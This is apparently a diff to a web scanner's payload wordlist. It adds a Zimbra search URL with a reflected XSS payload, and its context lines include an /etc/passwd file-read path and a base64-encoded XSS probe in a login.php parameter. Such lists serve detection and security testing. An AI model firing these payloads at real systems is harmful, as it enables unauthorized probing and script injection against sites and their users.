@@ -208,3 +208,4 @@
 /etc/passwd?raw??
 /pandora_console/attachment/pandora_chat.log.json.txt
 /login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn=
+/zimbra/h/search?si=1&so=0&sfi=4&st=message&csi=1&action=&cso=0&id=%22%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
